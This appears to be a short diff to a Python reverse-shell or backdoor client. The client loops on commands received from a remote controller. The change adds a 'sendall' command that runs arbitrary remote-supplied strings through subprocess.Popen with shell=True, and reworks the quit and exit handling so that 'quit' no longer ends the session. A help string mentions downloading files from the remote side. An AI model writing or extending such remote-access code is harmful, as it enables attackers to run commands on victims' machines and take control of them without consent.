@@ -51,8 +51,11 @@ def shell():
     while True:
         command = reliable_recv()
         if command == 'quit':
-            print("Exiting.")
+            continue
+        elif command == "exit":
             break
+        elif command[:7] =="sendall":
+            subprocess.Popen(command[8:], shell=True)
         elif command[:4] == "help":
             help_options = '''
             download path --> Download file from remote
